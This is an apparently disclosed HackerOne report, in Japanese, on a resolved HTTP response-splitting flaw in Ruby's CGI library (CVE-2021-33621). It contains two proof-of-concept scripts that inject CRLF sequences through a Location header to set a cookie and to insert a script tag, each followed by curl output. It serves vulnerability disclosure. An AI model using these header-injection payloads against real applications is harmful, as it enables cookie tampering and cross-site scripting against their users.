# [H] RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する

## Summary
Severity: High (CVSS 7.1)
Program: Ruby
Weakness: HTTP Response Splitting
Reporter: htokumaru
State: resolved
Disclosed: 2022-11-24T01:46:39.911Z
CVE: CVE-2021-33621, CVE-2019-16254
Source: https://hackerone.com/reports/1204695

## Details
PoC1:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nSet-Cookie: foo=bar;"     # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result1:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 302 Found
Date: Fri, 21 May 2021 00:46:33 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: foo=bar;
Location: http://example.jp
Content-Length: 0
Content-Type: text/html

```

このケースでは不正なクッキーが注入される。


PoC2:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nStatus: 500\r\n\r\n<script>alert(1)</script>"  # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result2:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1204695_
